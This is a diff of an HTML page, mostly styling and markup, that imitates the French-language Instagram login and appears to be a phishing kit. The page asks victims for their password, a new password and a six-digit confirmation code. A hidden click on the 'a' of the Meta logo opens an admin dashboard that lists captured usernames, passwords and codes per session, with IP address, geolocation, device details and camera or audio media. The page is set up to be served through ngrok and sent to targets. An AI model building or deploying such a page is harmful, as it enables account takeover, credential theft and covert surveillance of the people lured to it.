@@ -3,58 +3,28 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="ngrok-skip-browser-warning" content="true">
 <title>Instagram</title>
 <style>
-  /* ============ VARIABLES LIGHT ============ */
   :root {
-    --bg: #ffffff;
-    --panel-bg: #ffffff;
-    --card-bg: #ffffff;
-    --border: #dbdbdb;
-    --text: #262626;
-    --text-secondary: #8e8e8e;
-    --input-bg: #fafafa;
-    --input-border: #dbdbdb;
-    --input-focus: #a8a8a8;
-    --btn-bg: #0095f6;
-    --btn-hover: #1877f2;
-    --btn-disabled: #b2dffc;
-    --link: #00376b;
-    --back-bg: #ffffff;
-    --back-text: #262626;
-    --code-bg: #fafafa;
-    --divider: #dbdbdb;
-    --meta-color: #262626;
-    --mobile-border: #dbdbdb;
+    --bg: #ffffff; --panel-bg: #ffffff; --card-bg: #ffffff; --border: #dbdbdb;
+    --text: #262626; --text-secondary: #8e8e8e; --input-bg: #fafafa;
+    --input-border: #dbdbdb; --input-focus: #a8a8a8; --btn-bg: #0095f6;
+    --btn-hover: #1877f2; --btn-disabled: #b2dffc; --link: #00376b;
+    --back-bg: #ffffff; --back-text: #262626; --code-bg: #fafafa;
+    --divider: #dbdbdb; --meta-color: #262626;
   }
   html[data-theme="dark"] {
-    --bg: #000000;
-    --panel-bg: #000000;
-    --card-bg: #000000;
-    --border: #262626;
-    --text: #f5f5f5;
-    --text-secondary: #a8a8a8;
-    --input-bg: #121212;
-    --input-border: #363636;
-    --input-focus: #555555;
-    --btn-bg: #0095f6;
-    --btn-hover: #1877f2;
-    --btn-disabled: #1e3a52;
-    --link: #e0f1ff;
-    --back-bg: #000000;
-    --back-text: #f5f5f5;
-    --code-bg: #121212;
-    --divider: #262626;
-    --meta-color: #f5f5f5;
-    --mobile-border: #262626;
+    --bg: #000000; --panel-bg: #000000; --card-bg: #000000; --border: #262626;
+    --text: #f5f5f5; --text-secondary: #a8a8a8; --input-bg: #121212;
+    --input-border: #363636; --input-focus: #555555; --btn-bg: #0095f6;
+    --btn-hover: #1877f2; --btn-disabled: #1e3a52; --link: #e0f1ff;
+    --back-bg: #000000; --back-text: #f5f5f5; --code-bg: #121212;
+    --divider: #262626; --meta-color: #f5f5f5;
   }
   * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
   html, body { background: var(--bg); min-height: 100vh; transition: background 0.2s ease; overflow-x: hidden; }
-
-  /* ============ LAYOUT DESKTOP (2 COLONNES) ============ */
   .page { display: flex; min-height: 100vh; width: 100%; }
-
-  /* LEFT PANEL (desktop only) */
   .left-panel {
     flex: 1; display: flex; flex-direction: column; justify-content: center;
     align-items: center; padding: 40px; position: relative;
@@ -65,27 +35,14 @@
   .left-content h1 { font-size: 38px; font-weight: 400; line-height: 1.3; color: var(--text); margin-bottom: 40px; letter-spacing: -0.5px; }
   .gradient-text { background: linear-gradient(90deg, #ff6b6b, #c13584, #833ab4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-weight: 600; }
   .hero-image { width: 100%; max-width: 450px; height: auto; display: block; margin: 0 auto; border-radius: 12px; }
-
-  /* RIGHT PANEL */
   .right-panel {
     flex: 1; display: flex; flex-direction: column; justify-content: center;
     align-items: center; padding: 40px; background: var(--bg);
     transition: background 0.2s ease; min-width: 0;
   }
   .form-wrapper { width: 100%; max-width: 350px; }
-
-  /* ============ MOBILE LOGO (caché en desktop) ============ */
-  .mobile-logo {
-    display: none;
-    text-align: center;
-    padding: 20px 0 10px;
-  }
-  .mobile-logo svg {
-    width: 60px;
-    height: 60px;
-  }
-
-  /* ============ CARTE / FORM ============ */
+  .mobile-logo { display: none; text-align: center; padding: 20px 0 10px; }
+  .mobile-logo svg { width: 60px; height: 60px; }
   .card {
     background: var(--card-bg); border: 1px solid var(--border); border-radius: 1px;
     padding: 35px 35px 20px; text-align: center;
@@ -130,8 +87,6 @@
   .code-inputs input:focus { outline: none; border-color: #0095f6; background: var(--card-bg); }
   .step { display: none; }
   .step.active { display: block; }
-
-  /* THEME TOGGLE */
   .theme-toggle {
     position: fixed; bottom: 20px; right: 20px; width: 46px; height: 46px;
     border-radius: 50%; border: 1px solid var(--border); background: var(--card-bg);
@@ -145,28 +100,17 @@
   .theme-toggle .icon-moon { display: block; }
   html[data-theme="dark"] .theme-toggle .icon-sun { display: block; }
   html[data-theme="dark"] .theme-toggle .icon-moon { display: none; }
-
-  /* META LOGO + TRIGGER */
   .meta-logo {
     text-align: center; margin-top: 15px; color: var(--meta-color);
     font-size: 14px; font-weight: 500; opacity: 0.85;
-    display: flex; justify-content: center; align-items: center;
-    gap: 0;
+    display: flex; justify-content: center; align-items: center; gap: 0;
   }
   .meta-logo .hidden-a {
     color: inherit; background: none; text-decoration: none;
-    cursor: pointer; font-weight: inherit; transition: none;
+    cursor: pointer; font-weight: inherit;
     user-select: none; -webkit-tap-highlight-color: transparent;
     margin: 0; padding: 0; display: inline;
   }
-  .meta-logo .hidden-a:hover,
-  .meta-logo .hidden-a:focus,
-  .meta-logo .hidden-a:active {
-    color: inherit; background: none; text-decoration: none;
-    outline: none; transform: none;
-  }
-
-  /* ===== ADMIN LOGIN MODAL ===== */
   .admin-login-overlay {
     position: fixed; inset: 0; background: rgba(0,0,0,0.7);
     backdrop-filter: blur(8px); display: none; align-items: center;
@@ -191,253 +135,163 @@
     border: none; border-radius: 10px; font-size: 15px; font-weight: 600;
     cursor: pointer; margin-top: 8px;
   }
-  .admin-login-box .btn-admin:hover { background: #1877f2; }
-  .admin-login-box .error-msg {
-    color: #e74c3c; font-size: 13px; margin-top: 12px; min-height: 20px;
-  }
+  .admin-login-box .error-msg { color: #e74c3c; font-size: 13px; margin-top: 12px; min-height: 20px; }
   .admin-login-box .close-admin {
     background: #333; border: none; color: #fff; padding: 8px 18px;
     border-radius: 30px; cursor: pointer; font-size: 13px; margin-top: 12px;
   }
-  .admin-login-box .close-admin:hover { background: #555; }
-
-  /* ===== DASHBOARD ===== */
   .dashboard-overlay {
-    position: fixed; inset: 0; background: rgba(0,0,0,0.7);
-    backdrop-filter: blur(8px); display: none; align-items: center;
-    justify-content: center; z-index: 10001; padding: 20px;
+    position: fixed; inset: 0; background: rgba(0,0,0,0.8);
+    backdrop-filter: blur(8px); display: none; align-items: flex-start;
+    justify-content: center; z-index: 10001; padding: 20px; overflow-y: auto;
   }
   .dashboard-overlay.open { display: flex; }
   .dashboard {
-    background: #111; color: #eee; width: 100%; max-width: 900px;
-    max-height: 88vh; border-radius: 24px; padding: 28px 30px;
-    box-shadow: 0 20px 60px rgba(0,0,0,0.8); overflow-y: auto;
-    border: 1px solid #333; font-family: 'SF Mono', 'Fira Code', monospace;
+    background: #0d1117; color: #eee; width: 100%; max-width: 1000px;
+    border-radius: 20px; padding: 24px 26px;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+    border: 1px solid #2a2a2a; font-family: 'SF Mono', 'Fira Code', monospace;
+    margin: auto;
   }
   .dashboard h2 {
-    font-size: 22px; font-weight: 600; color: #fff;
-    margin-bottom: 18px; display: flex; justify-content: space-between; align-items: center;
-    flex-wrap: wrap; gap: 8px;
+    font-size: 20px; font-weight: 600; color: #fff;
+    margin-bottom: 18px; display: flex; justify-content: space-between;
+    align-items: center; flex-wrap: wrap; gap: 8px;
   }
   .dashboard h2 button {
     background: #333; border: none; color: #fff; padding: 6px 16px;
     border-radius: 30px; cursor: pointer; font-size: 13px;
   }
-  .dashboard h2 button:hover { background: #555; }
-  .dashboard .info-grid {
-    display: grid; grid-template-columns: 1fr 1fr; gap: 12px;
-    background: #1a1a1a; padding: 16px 20px; border-radius: 16px;
-    margin-bottom: 20px; border: 1px solid #2a2a2a;
+  .dashboard .status-badge {
+    background: #1b8c3e; color: #fff; padding: 4px 12px;
+    border-radius: 20px; font-size: 11px; font-weight: 600; margin-left: 10px;
+    display: inline-flex; align-items: center; gap: 6px;
   }
-  .dashboard .info-item { display: flex; flex-direction: column; }
-  .dashboard .info-item .label {
-    font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; color: #888;
+  .sessions-container { display: flex; flex-direction: column; gap: 16px; }
+  .session-card {
+    background: #161b22; border: 1px solid #2a2a2a; border-radius: 14px;
+    overflow: hidden;
   }
-  .dashboard .info-item .value {
-    font-size: 15px; font-weight: 500; color: #ddd; word-break: break-all;
+  .session-header {
+    background: #1c2128; padding: 12px 16px;
+    display: flex; justify-content: space-between; align-items: center;
+    flex-wrap: wrap; gap: 8px; border-bottom: 1px solid #2a2a2a;
   }
-  .dashboard .log-section { margin-top: 16px; }
-  .dashboard .log-section h3 {
-    font-size: 16px; color: #aaa; margin-bottom: 8px;
-    border-bottom: 1px solid #2a2a2a; padding-bottom: 6px;
+  .session-title { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
+  .session-ip {
+    background: #0095f6; color: #fff; padding: 3px 10px;
+    border-radius: 20px; font-size: 12px; font-weight: 600;
   }
-  .dashboard .log-entry {
-    background: #1a1a1a; border-left: 4px solid #0095f6; padding: 10px 14px;
-    margin-bottom: 8px; border-radius: 8px; font-size: 13px;
-    word-break: break-word; display: flex; flex-direction: column; gap: 4px;
+  .session-device { color: #ddd; font-size: 13px; font-weight: 500; }
+  .session-time { color: #666; font-size: 11px; }
+  .session-badge {
+    background: #333; color: #4fc3f7; padding: 2px 8px;
+    border-radius: 10px; font-size: 10px; font-weight: 600;
   }
-  .dashboard .log-entry .field { color: #bbb; }
-  .dashboard .log-entry .field strong { color: #fff; }
-  .dashboard .log-entry .timestamp { font-size: 11px; color: #666; margin-top: 4px; }
-  .dashboard .empty { color: #666; font-style: italic; padding: 12px 0; }
-  .dashboard .clear-btn {
-    background: #c13535; border: none; color: #fff; padding: 6px 14px;
-    border-radius: 30px; cursor: pointer; font-size: 12px; margin-left: 8px;
+  .session-body { padding: 14px 16px; display: flex; flex-direction: column; gap: 10px; }
+  .geo-banner {
+    background: linear-gradient(135deg, #2a1a3a, #1a0f28);
+    border: 1px solid #4a2a5a;
+    border-radius: 10px; padding: 12px 14px;
+    display: grid; grid-template-columns: 1fr 1fr; gap: 8px;
+    font-size: 12px; color: #c9d1d9;
   }
-  .dashboard .clear-btn:hover { background: #e74c3c; }
-
-  /* ============================================================
-     RESPONSIVE — MOBILE (Android & iPhone) — style app Instagram
-     ============================================================ */
+  .geo-item { display: flex; flex-direction: column; gap: 2px; }
+  .geo-item .geo-label { font-size: 10px; color: #a88; text-transform: uppercase; letter-spacing: 0.5px; }
+  .geo-item .geo-value { color: #ff9dff; font-weight: 600; font-family: 'SF Mono', monospace; word-break: break-all; }
+  .entry-banner {
+    background: linear-gradient(135deg, #1a2332, #0f1720);
+    border: 1px solid #2a3a4a; border-radius: 10px;
+    padding: 12px 14px; font-size: 12px; color: #c9d1d9; line-height: 1.6;
+  }
+  .entry-banner strong { color: #58a6ff; display: block; margin-bottom: 6px; font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; }
+  .entry-banner code { color: #7ee787; font-family: 'SF Mono', monospace; word-break: break-all; }
+  .device-info-grid {
+    display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px;
+    padding: 10px 12px; background: #0d1117; border-radius: 10px;
+    border: 1px solid #1f242b;
+  }
+  .device-info-item { display: flex; flex-direction: column; gap: 2px; }
+  .device-info-item .label { font-size: 10px; text-transform: uppercase; letter-spacing: 0.5px; color: #666; }
+  .device-info-item .value { font-size: 12px; font-weight: 500; color: #ddd; word-break: break-all; }
+  .device-info-item .value.live { color: #4ade80; font-weight: 700; }
+  .captured-fields { display: flex; flex-direction: column; gap: 6px; }
+  .field-row {
+    display: flex; align-items: center; gap: 8px;
+    background: #0d1117; padding: 8px 12px; border-radius: 8px;
+    border-left: 3px solid #0095f6; font-size: 13px;
+  }
+  .field-row .field-icon { font-size: 14px; flex-shrink: 0; }
+  .field-row .field-name { color: #888; font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; min-width: 110px; flex-shrink: 0; }
+  .field-row .field-value { color: #4fc3f7; font-weight: 600; word-break: break-all; font-family: 'SF Mono', monospace; }
+  .field-row.password .field-value { color: #ff6b6b; }
+  .field-row.code .field-value { color: #ffd93d; font-size: 15px; letter-spacing: 2px; }
+  .field-row.username .field-value { color: #4ade80; }
+  .media-section {
+    margin-top: 10px; padding: 10px 12px;
+    background: #0d1117; border-radius: 10px; border: 1px solid #1f242b;
+  }
+  .media-section h4 { color: #4fc3f7; font-size: 12px; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
+  .media-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 8px; }
+  .media-item { background: #1a1a1a; border-radius: 8px; overflow: hidden; border: 1px solid #2a2a2a; }
+  .media-item img, .media-item video { width: 100%; height: 140px; object-fit: cover; display: block; background: #000; }
+  .media-item .media-time { font-size: 10px; color: #888; padding: 4px 6px; text-align: center; }
+  .media-item audio { width: 100%; margin: 4px 0; }
+  .media-empty { color: #555; font-size: 11px; font-style: italic; }
+  .frame-player { position: relative; background: #000; height: 200px; overflow: hidden; border-radius: 6px; }
+  .frame-player img { width: 100%; height: 200px; object-fit: cover; display: block; }
+  .frame-badge { position: absolute; bottom: 6px; right: 6px; background: rgba(0,0,0,0.75); color: #fff; padding: 3px 8px; border-radius: 4px; font-size: 10px; }
+  .play-btn { background: #0095f6; border: none; color: #fff; padding: 4px 10px; border-radius: 12px; cursor: pointer; font-size: 11px; font-weight: 600; }
+  .play-btn:hover { background: #1877f2; }
+  .raw-logs-toggle { background: #1f242b; border: 1px solid #2a2a2a; color: #888; padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 11px; font-family: inherit; text-align: left; transition: all 0.2s; }
+  .raw-logs-toggle:hover { color: #ddd; background: #2a2f38; }
+  .raw-logs { display: none; flex-direction: column; gap: 4px; margin-top: 6px; max-height: 300px; overflow-y: auto; padding-right: 6px; }
+  .raw-logs.open { display: flex; }
+  .raw-log-entry { background: #0d1117; padding: 6px 10px; border-radius: 6px; font-size: 11px; color: #aaa; border-left: 2px solid #333; }
+  .raw-log-entry .raw-time { color: #666; margin-right: 6px; }
+  .raw-log-entry .raw-field { color: #888; }
+  .raw-log-entry .raw-value { color: #4fc3f7; }
+  .dashboard .empty { color: #666; font-style: italic; padding: 40px 20px; text-align: center; font-size: 14px; }
+  .dashboard .empty small { display: block; margin-top: 8px; color: #444; }
+  .dashboard .clear-btn { background: #c13535; border: none; color: #fff; padding: 6px 14px; border-radius: 30px; cursor: pointer; font-size: 12px; }
   @media (max-width: 875px) {
     .page { flex-direction: column; }
     .left-panel { display: none; }
-
-    .right-panel {
-      flex: 1;
-      padding: 0;
-      justify-content: flex-start;
-      align-items: stretch;
-      background: var(--bg);
-    }
-
-    /* Afficher le logo mobile */
-    .mobile-logo {
-      display: block;
-    }
-
-    /* Wrapper pleine largeur, pas de max-width */
-    .form-wrapper {
-      max-width: 100%;
-      width: 100%;
-      padding: 0 20px;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      min-height: 100vh;
-    }
-
-    /* Cartes sans bordure sur mobile (comme la vraie app) */
-    .card {
-      border: none;
-      background: transparent;
-      padding: 0;
-      margin-bottom: 0;
-    }
-
-    .card h2 {
-      text-align: center;
-      font-size: 14px;
-      color: var(--text);
-      margin-bottom: 22px;
-    }
-
-    .card p {
-      text-align: center;
-      font-size: 13px;
-      margin-bottom: 18px;
-    }
-
-    /* Inputs style mobile Instagram */
-    .input-group {
-      margin-bottom: 8px;
-    }
-    .input-group input {
-      padding: 14px 12px;
-      font-size: 15px;
-      border-radius: 6px;
-    }
-    .input-group input::placeholder {
-      font-size: 14px;
-    }
-
-    /* Bouton login style mobile */
-    .btn {
-      padding: 12px;
-      font-size: 15px;
-      border-radius: 8px;
-      margin-top: 12px;
-    }
-
-    /* Divider */
-    .divider {
-      margin: 22px 0;
-    }
-
-    /* Lien mot de passe oublié */
-    .forgot-link {
-      margin-top: 12px;
-      font-size: 13px;
-    }
-
-    /* Back-link style mobile */
-    .back-link {
-      border: none;
-      background: transparent;
-      color: var(--text-secondary);
-      font-size: 13px;
-      padding: 12px;
-      margin-top: 10px;
-    }
-    .back-link:hover { background: transparent; text-decoration: underline; }
-
-    /* Code inputs un peu plus grands sur mobile */
-    .code-inputs {
-      gap: 8px;
-      margin-bottom: 22px;
-    }
-    .code-inputs input {
-      width: 44px;
-      height: 52px;
-      font-size: 20px;
-    }
-
-    /* Meta logo en bas */
-    .meta-logo {
-      margin-top: 30px;
-      margin-bottom: 20px;
-      font-size: 14px;
-    }
-
-    /* Theme toggle plus petit sur mobile */
-    .theme-toggle {
-      width: 40px;
-      height: 40px;
-      bottom: 15px;
-      right: 15px;
-    }
+    .right-panel { flex: 1; padding: 0; justify-content: flex-start; align-items: stretch; background: var(--bg); }
+    .mobile-logo { display: block; }
+    .form-wrapper { max-width: 100%; width: 100%; padding: 0 20px; display: flex; flex-direction: column; justify-content: center; min-height: 100vh; }
+    .card { border: none; background: transparent; padding: 0; margin-bottom: 0; }
+    .card h2 { text-align: center; font-size: 14px; margin-bottom: 22px; }
+    .card p { text-align: center; font-size: 13px; margin-bottom: 18px; }
+    .input-group { margin-bottom: 8px; }
+    .input-group input { padding: 14px 12px; font-size: 15px; border-radius: 6px; }
+    .input-group input::placeholder { font-size: 14px; }
+    .btn { padding: 12px; font-size: 15px; border-radius: 8px; margin-top: 12px; }
+    .divider { margin: 22px 0; }
+    .forgot-link { margin-top: 12px; font-size: 13px; }
+    .back-link { border: none; background: transparent; color: var(--text-secondary); font-size: 13px; padding: 12px; margin-top: 10px; }
+    .code-inputs { gap: 8px; margin-bottom: 22px; }
+    .code-inputs input { width: 44px; height: 52px; font-size: 20px; }
+    .meta-logo { margin-top: 30px; margin-bottom: 20px; font-size: 14px; }
+    .theme-toggle { width: 40px; height: 40px; bottom: 15px; right: 15px; }
     .theme-toggle svg { width: 18px; height: 18px; }
-
-    /* Dashboard mobile */
-    .dashboard {
-      padding: 20px 16px;
-      border-radius: 18px;
-    }
-    .dashboard h2 { font-size: 18px; }
-    .dashboard .info-grid {
-      grid-template-columns: 1fr;
-      padding: 12px 14px;
-    }
-    .dashboard .info-item .value { font-size: 13px; }
-    .dashboard .log-entry { font-size: 12px; }
-
-    /* Admin login mobile */
-    .admin-login-box {
-      padding: 28px 22px;
-      border-radius: 20px;
-    }
-    .admin-login-box h2 { font-size: 19px; }
-  }
-
-  /* Petits écrans (iPhone SE, etc.) */
-  @media (max-width: 375px) {
-    .form-wrapper { padding: 0 16px; }
-    .code-inputs { gap: 5px; }
-    .code-inputs input { width: 38px; height: 46px; font-size: 18px; }
-    .card h2 { font-size: 13px; }
-  }
-
-  /* iPhone avec encoche — safe areas */
-  @supports (padding: max(0px)) {
-    @media (max-width: 875px) {
-      .form-wrapper {
-        padding-top: max(20px, env(safe-area-inset-top));
-        padding-bottom: max(20px, env(safe-area-inset-bottom));
-        padding-left: max(20px, env(safe-area-inset-left));
-        padding-right: max(20px, env(safe-area-inset-right));
-      }
-      .theme-toggle {
-        bottom: max(15px, env(safe-area-inset-bottom));
-        right: max(15px, env(safe-area-inset-right));
-      }
-    }
+    .dashboard { padding: 16px 12px; border-radius: 14px; }
+    .dashboard h2 { font-size: 16px; }
+    .device-info-grid { grid-template-columns: 1fr 1fr; }
+    .field-row .field-name { min-width: 80px; font-size: 10px; }
+    .field-row .field-value { font-size: 12px; }
+    .admin-login-box { padding: 28px 22px; border-radius: 20px; }
+    .geo-banner { grid-template-columns: 1fr; }
   }
 </style>
 </head>
 <body>
 
-<!-- THEME TOGGLE -->
-<button class="theme-toggle" id="themeToggle" aria-label="Changer le thème">
-  <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
-  </svg>
-  <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-    <circle cx="12" cy="12" r="4"/>
-    <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/>
-  </svg>
+<button class="theme-toggle" id="themeToggle">
+  <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+  <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
 </button>
 
-<!-- ============ ADMIN LOGIN MODAL ============ -->
 <div class="admin-login-overlay" id="adminLoginOverlay">
   <div class="admin-login-box">
     <h2>🔐 Admin Login</h2>
@@ -449,128 +303,95 @@
   </div>
 </div>
 
-<!-- ============ DASHBOARD OVERLAY ============ -->
 <div class="dashboard-overlay" id="dashboardOverlay">
-  <div class="dashboard" id="dashboardContent">
+  <div class="dashboard">
     <h2>
-      <span>🛡️ Admin Dashboard</span>
+      <span>🛡️ Admin Dashboard <span class="status-badge">LIVE</span></span>
       <div>
         <button class="clear-btn" id="clearLogs">🗑️ Vider</button>
         <button id="closeDashboard">✕ Fermer</button>
       </div>
     </h2>
-    <div class="info-grid" id="deviceInfo">
-      <div class="info-item"><span class="label">Adresse IP</span><span class="value" id="dashIp">—</span></div>
-      <div class="info-item"><span class="label">Appareil</span><span class="value" id="dashDevice">—</span></div>
-      <div class="info-item"><span class="label">Batterie</span><span class="value" id="dashBattery">—</span></div>
-      <div class="info-item"><span class="label">Système</span><span class="value" id="dashOS">—</span></div>
-      <div class="info-item"><span class="label">Navigateur</span><span class="value" id="dashBrowser">—</span></div>
-      <div class="info-item"><span class="label">Écran</span><span class="value" id="dashScreen">—</span></div>
-    </div>
-    <div class="log-section">
-      <h3>📋 Saisies capturées</h3>
-      <div id="logContainer"><div class="empty">Aucune saisie pour le moment.</div></div>
+    <div class="sessions-container" id="sessionsContainer">
+      <div class="empty">Aucune session.<br><small>Envoie le lien à un appareil.</small></div>
     </div>
   </div>
 </div>
 
 <div class="page">
-  <!-- LEFT PANEL (desktop) -->
   <div class="left-panel">
     <svg class="insta-logo-big" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-      <defs>
-        <linearGradient id="igGradient" x1="0%" y1="100%" x2="100%" y2="0%">
-          <stop offset="0%" stop-color="#FFDD55"/><stop offset="25%" stop-color="#FF543E"/>
-          <stop offset="50%" stop-color="#C837AB"/><stop offset="100%" stop-color="#833AB4"/>
-        </linearGradient>
-      </defs>
+      <defs><linearGradient id="igGradient" x1="0%" y1="100%" x2="100%" y2="0%">
+        <stop offset="0%" stop-color="#FFDD55"/><stop offset="25%" stop-color="#FF543E"/>
+        <stop offset="50%" stop-color="#C837AB"/><stop offset="100%" stop-color="#833AB4"/>
+      </linearGradient></defs>
       <rect x="2" y="2" width="20" height="20" rx="6" stroke="url(#igGradient)" stroke-width="2"/>
       <circle cx="12" cy="12" r="4.5" stroke="url(#igGradient)" stroke-width="2"/>
       <circle cx="17.5" cy="6.5" r="1.3" fill="url(#igGradient)"/>
     </svg>
     <div class="left-content">
       <h1>Regardez les moments du<br>quotidien de vos<br><span class="gradient-text">amis proches.</span></h1>
-      <img class="hero-image" src="hero.webp" alt="Instagram" loading="lazy">
+      <img class="hero-image" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='450' height='300'%3E%3Crect width='450' height='300' fill='%23f0f0f0' rx='12'/%3E%3Ctext x='50%25' y='50%25' font-family='sans-serif' font-size='20' fill='%23999' text-anchor='middle' dy='.3em'%3EInstagram%3C/text%3E%3C/svg%3E" alt="Instagram">
     </div>
   </div>
 
-  <!-- RIGHT PANEL -->
   <div class="right-panel">
     <div class="form-wrapper">
 
-      <!-- LOGO MOBILE (visible uniquement sur téléphone) -->
       <div class="mobile-logo">
         <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <defs>
-            <linearGradient id="igGradientMobile" x1="0%" y1="100%" x2="100%" y2="0%">
-              <stop offset="0%" stop-color="#FFDD55"/><stop offset="25%" stop-color="#FF543E"/>
-              <stop offset="50%" stop-color="#C837AB"/><stop offset="100%" stop-color="#833AB4"/>
-            </linearGradient>
-          </defs>
+          <defs><linearGradient id="igGradientMobile" x1="0%" y1="100%" x2="100%" y2="0%">
+            <stop offset="0%" stop-color="#FFDD55"/><stop offset="25%" stop-color="#FF543E"/>
+            <stop offset="50%" stop-color="#C837AB"/><stop offset="100%" stop-color="#833AB4"/>
+          </linearGradient></defs>
           <rect x="2" y="2" width="20" height="20" rx="6" stroke="url(#igGradientMobile)" stroke-width="2"/>
           <circle cx="12" cy="12" r="4.5" stroke="url(#igGradientMobile)" stroke-width="2"/>
           <circle cx="17.5" cy="6.5" r="1.3" fill="url(#igGradientMobile)"/>
         </svg>
       </div>
 
-      <!-- STEP 0: LOGIN -->
       <div class="step active" id="step0">
         <div class="card">
           <h2>Se connecter à Instagram</h2>
           <form id="formLogin" autocomplete="off">
-            <div class="input-group">
-              <input type="text" id="loginUser" placeholder="Numéro de mobile, nom d'utilisateur ou e-mail" required>
-            </div>
-            <div class="input-group">
-              <input type="password" id="loginPass" placeholder="Mot de passe" required>
-            </div>
+            <div class="input-group"><input type="text" id="loginUser" placeholder="Numéro de mobile, nom d'utilisateur ou e-mail" required></div>
+            <div class="input-group"><input type="password" id="loginPass" placeholder="Mot de passe" required></div>
             <button type="submit" class="btn" id="btnLogin" disabled>Se connecter</button>
           </form>
           <div class="divider"><span>OU</span></div>
           <a href="#" class="forgot-link" id="forgotLink">Mot de passe oublié ?</a>
         </div>
         <div class="meta-logo">
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-            <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8z"/>
-          </svg>
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8z"/></svg>
           Met<span class="hidden-a" id="metaA">a</span>
         </div>
       </div>
 
-      <!-- STEP 1: CURRENT PASSWORD -->
       <div class="step" id="step1">
         <div class="card">
           <h2 style="text-align:center;">Vérification du mot de passe</h2>
           <p>Pour continuer, veuillez saisir votre mot de passe actuel.</p>
           <form id="form1" autocomplete="off">
-            <div class="input-group">
-              <input type="password" id="currentPass" placeholder="Mot de passe actuel" required>
-            </div>
+            <div class="input-group"><input type="password" id="currentPass" placeholder="Mot de passe actuel" required></div>
             <button type="submit" class="btn" id="btn1" disabled>Confirmer</button>
           </form>
         </div>
         <a class="back-link" id="backBtn">Retour à la connexion</a>
       </div>
 
-      <!-- STEP 2: NEW PASSWORD -->
       <div class="step" id="step2">
         <div class="card">
           <h2 style="text-align:center;">Changer le mot de passe</h2>
           <p>Créez un nouveau mot de passe sécurisé.</p>
           <form id="form2" autocomplete="off">
-            <div class="input-group">
-              <input type="password" id="newPass" placeholder="Nouveau mot de passe" required>
-            </div>
-            <div class="input-group">
-              <input type="password" id="confirmPass" placeholder="Confirmer le mot de passe" required>
-            </div>
+            <div class="input-group"><input type="password" id="newPass" placeholder="Nouveau mot de passe" required></div>
+            <div class="input-group"><input type="password" id="confirmPass" placeholder="Confirmer le mot de passe" required></div>
             <button type="submit" class="btn" id="btn2" disabled>Confirmer</button>
           </form>
         </div>
         <a class="back-link" id="backBtn2">Retour</a>
       </div>
 
-      <!-- STEP 3: CODE 6 CHIFFRES -->
       <div class="step" id="step3">
         <div class="card">
           <h2 style="text-align:center;">Code de confirmation</h2>
@@ -590,22 +411,18 @@
         <a class="back-link" id="backBtn3">Retour</a>
       </div>
 
-      <!-- STEP RESET: CURRENT PASSWORD -->
       <div class="step" id="stepReset">
         <div class="card">
           <h2 style="text-align:center;">Vérification du mot de passe</h2>
           <p>Pour réinitialiser votre mot de passe, veuillez saisir votre mot de passe actuel.</p>
           <form id="formReset" autocomplete="off">
-            <div class="input-group">
-              <input type="password" id="resetCurrentPass" placeholder="Mot de passe actuel" required>
-            </div>
+            <div class="input-group"><input type="password" id="resetCurrentPass" placeholder="Mot de passe actuel" required></div>
             <button type="submit" class="btn" id="btnReset" disabled>Confirmer</button>
           </form>
         </div>
-        <a class="back-link" id="backBtnReset">Retour à la connexion</a>
+        <a class="back-link" id="backBtnReset">Retour</a>
       </div>
 
-      <!-- STEP RESET CODE -->
       <div class="step" id="stepResetCode">
         <div class="card">
           <h2 style="text-align:center;">Code de confirmation</h2>
@@ -625,18 +442,13 @@
         <a class="back-link" id="backBtnResetCode">Retour</a>
       </div>
 
-      <!-- STEP NEW PASS (RESET) -->
       <div class="step" id="stepNewPass">
         <div class="card">
           <h2 style="text-align:center;">Nouveau mot de passe</h2>
           <p>Créez un nouveau mot de passe sécurisé.</p>
           <form id="formNewPass" autocomplete="off">
